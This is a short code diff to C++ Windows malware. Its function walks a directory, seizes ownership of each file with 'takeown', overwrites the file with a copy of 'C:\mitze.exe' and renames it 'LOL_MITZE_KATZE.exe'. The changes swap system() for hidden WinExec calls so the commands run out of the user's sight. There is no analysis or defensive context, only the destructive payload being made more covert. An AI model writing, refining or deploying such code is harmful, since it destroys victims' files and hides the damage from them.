@@ -29,7 +29,7 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 			Chain = Chain + sWords[rand() % 4];
 			//cout << Chain;
 			string Chickfila = directory + std::string(FindFileData.cFileName);
-			CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
+			CopyFile("C:\\mitze.exe",Chickfila.c_str(),0);
 			rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
 		}
 		while (FindNextFile(hFind, &FindFileData) != 0)
@@ -41,13 +41,13 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				string Chickfila = directory + std::string(FindFileData.cFileName);
 				mciSendString("play meow.mp3", NULL, 0, NULL);
 				string Gutter = "takeown /f " + string(Chickfila);
-				string Butter = "copy /y C:/mitze.exe "+ string(Chickfila);
-				cout << Chickfila.c_str();
+				string Butter = "copy C:\\mitze.exe /Y "+ string(Chickfila);
+				//cout << Butter;
 				const char* Sucker = Gutter.c_str();
 				const char* Sucker2 = Butter.c_str();
-				system(Sucker);
+				WinExec(Sucker, SW_HIDE);
 				//PlaySound(TEXT("meow.mp3"),NULL,SND_FILENAME | SND_ASYNC);
-				system(Sucker2);
+				WinExec(Sucker2, SW_HIDE);
 				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
 			}
 			else
